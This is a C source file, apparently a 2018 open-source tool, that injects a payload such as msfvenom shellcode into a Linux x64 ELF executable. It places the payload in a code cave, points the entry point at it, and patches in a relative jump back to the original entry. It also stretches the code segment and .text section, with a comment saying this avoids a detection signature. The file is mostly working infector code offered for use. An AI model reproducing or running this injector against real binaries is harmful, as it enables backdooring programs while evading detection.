/**
 * Author: Robert Hendriks
 * Version: 0.1
 * Description: An ELF injector for linux x64
 * TODO:
 * 		- Add x86 support
 * 		- Add marker for already injected files
 *
 *	Features:
 *		- Uses a relative jump towards OEP (compatible with ASLR)
 *		- Stretch the .text section to prevent EP outside of section
 *
 *	Based on a tutorial about ELF injection to be found here: https://0x00sec.org/t/elfun-file-injector/410
 *
 * Copyright 2018
 *
	Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 *
 *
 */

#include <stdio.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include "elf64.h"


#define NOP_OPCODE 0x90
#define REL_LONG_JMP_OPCODE 0xE9
//5 bytes for a rel long jump (opcode + 4 bytes offset)
#define SIZE_OF_REL_LONG_JUMP 5

int open_and_map_elf(char *fname, uint8_t **data, uint8_t write_back){
  //Open the file
  FILE* fd = fopen(fname, "a+");
  if(fd < 0){
    perror("Opening file: ");
    return -1;
  }
  
  //Get size of the file
  fseek(fd, 0, SEEK_END);
  int len = ftell(fd);
  rewind(fd);

  //Map the file into memory
  if(write_back){
    *data = mmap(0, len, PROT_READ|PROT_WRITE, MAP_SHARED, fileno(fd), 0);
  } else {
    *data = mmap(0, len + SIZE_OF_REL_LONG_JUMP, PROT_READ|PROT_WRITE, MAP_PRIVATE, fileno(fd), 0);
  }

  if(*data == MAP_FAILED){
    perror("mmap:");
    fclose(fd);
    return -1;
  }

  return fileno(fd);
}

uint8_t verify_elf_signature(char *data){
  if(data[1] == 'E' && data[2] == 'L' && data[3] == 'F'){
    return 1;
  }
  return 0;
}


int main (int argc, char **argv){
  uint8_t *data = NULL;
  int fd = open_and_map_elf(argv[1], &data, 1);
  if(!verify_elf_signature(data)){
    printf("[-] Target not a valid ELF executable!\n");
	return 1;
  }

  Elf64_Ehdr *elf_hdr = (Elf64_Ehdr *) data;
  printf("[+] Entry point: %p\n", (void*) elf_hdr->e_entry);

  //Find an gap
  uint64_t gap_offset = 0, gap_size = 0;
  Elf64_Phdr *code_segment = find_elf64_gap(data, elf_hdr, &gap_offset, &gap_size);
  if(!code_segment){
    printf("[-] Unable to find code segment!\n");
	return -1;
  }

  uint8_t *payload_data = NULL;
  int payload_fd = open_and_map_elf(argv[2], &payload_data, 0);
  if(!verify_elf_signature(payload_data)){
    printf("[-] Payload not a valid ELF executable!\n");
	return 1;
  }


  //Get payload data
  uint64_t payload_size = 0;
  uint64_t payload_offset = 0;
  
  Elf64_Shdr *payload_text_section = find_elf64_section(payload_data, ".text");
  if(payload_text_section){
    payload_size = payload_text_section->sh_size;
	payload_offset = payload_text_section->sh_offset;
  } else {
    printf("[w] No .text section found inside payload ELF (may be caused by sectionless ELFs, like those created by msfvenom)\n");
	printf("[+] Trying to use the code segment\n");
	Elf64_Phdr *payload_code_segment = find_elf64_code_segment(payload_data, elf_hdr, NULL);
	if(!payload_code_segment) {
	  printf("[-] No code segment was found inside ELF payload... Aborting\n");
  	  return 1;
	}
	payload_size = payload_code_segment->p_filesz;
	payload_offset = payload_code_segment->p_offset;
	
	if(payload_offset == 0){
	  printf("[w] Payload offset at 0, trying to guess the start ... this is getting tricky\n");
	  Elf64_Ehdr *payload_elf_header = (Elf64_Ehdr *)payload_data;
	  payload_offset = payload_elf_header->e_ehsize + (payload_elf_header->e_phentsize * payload_elf_header->e_phnum);	
	  printf("[i] Guessed payload offset: %i bytes from start\n", payload_offset);
	}
  }	

  printf("[+] Size of payload is %d bytes\n", payload_size);
  if(payload_size > gap_size){
    printf("[-] Gap size to small for payload!\n");
    return 1;
  }


  //Find NOPs inside payload
  uint32_t nop_offset = 0;
  printf("Size of payload: %i\n", payload_size);
  printf("Offset of payload: %i\n", payload_offset);
  for(uint32_t i = 0; i < payload_size; i++){
    if(payload_data[payload_offset + i] == NOP_OPCODE){
      nop_offset = payload_offset + i;
      break;
    }
  }

  //Check if NOPs are found
  if(nop_offset == 0){
	printf("[-] NOPs not found inside payload, are they present?\n");
    return 1;
  }


  //Calc offset to org_ep  
  uint32_t offset_to_start_of_payload = (nop_offset - payload_offset) + SIZE_OF_REL_LONG_JUMP;
  uint32_t offset_to_org_ep = (gap_offset - elf_hdr->e_entry) + offset_to_start_of_payload;

  //Offset_to_org_ep is the number of bytes we need to jump, however we need to jump back since we injected at the end of .text section
  //So convert the offset to a negative number first (-1 because 0 is seen as a positive number)
  uint32_t jmp_value = (offset_to_org_ep - 1) ^ 0xFFFFFFFF;

  //Inject an long relative JMP
  //Store little endian jump value
  payload_data[nop_offset] = REL_LONG_JMP_OPCODE;
  payload_data[nop_offset + 1] = (uint8_t)(jmp_value>>0);
  payload_data[nop_offset + 2] = (uint8_t)(jmp_value>>8);
  payload_data[nop_offset + 3] = (uint8_t)(jmp_value>>16);
  payload_data[nop_offset + 4] = (uint8_t)(jmp_value>>24);

  //Copy payload to target
  memmove(&data[gap_offset], &payload_data[payload_offset], payload_size); 
  elf_hdr->e_entry = (Elf64_Addr) gap_offset;

  //Stretching is done to prevent a signature where the EP is outside of the .text section (or any section for that matter)
  //Stretch code segment to include injected code
  code_segment->p_filesz += payload_size;
  code_segment->p_memsz += payload_size;

  //Stretch .text section 
  Elf64_Shdr *text_section = find_elf64_section(data, ".text"); 
  text_section->sh_size += payload_size; 


  printf("[+] New entrypoint at 0x%x\n", gap_offset); 

  close(fd);
  close(payload_fd);

  return 0;
}
